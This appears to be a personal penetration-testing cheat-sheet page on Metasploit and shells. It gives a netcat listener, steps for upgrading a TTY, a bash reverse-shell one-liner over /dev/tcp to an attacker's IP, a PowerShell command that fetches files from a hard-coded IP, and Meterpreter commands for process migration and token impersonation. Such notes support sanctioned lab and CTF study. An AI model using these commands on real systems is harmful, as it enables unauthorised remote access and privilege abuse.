---
layout: single
classes: #wide
title: "Metasploit & Shells"
sidebar:
    title: "Metasploit"
    nav: infosec
collection: infopages
permalink: /infosec/metasploit/
toc: true
toc_sticky: true
author_profile: true
---

# Shells
reverse shell tips:  
```rlwrap nc -lnvpn``` (reverse shell with better fuctionality/arrowkeys)  

after get shell:  
```python3 -c 'import pty;pty.spawn("/bin/bash")'```
```ctrl - z```(to background the nc process)  
```stty raw -echo;fg```
```export TERM=xterm```   
* makes able to clear term
* better machine access

bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1

## Post shells
Uploading files: 
`powershell -c "curl 9.13.53.1:9999/$file -OutFile $file"`

# Commands
* `migrate <pid>`
 
# Meterpreter

## Windows
`load powershell` - loads into meterpreter  
`powershell_shell`  
`shell`  

## Modules
incognito - allows user token impersonation  
- just because have high level token doesn't mean you have perms of high level token

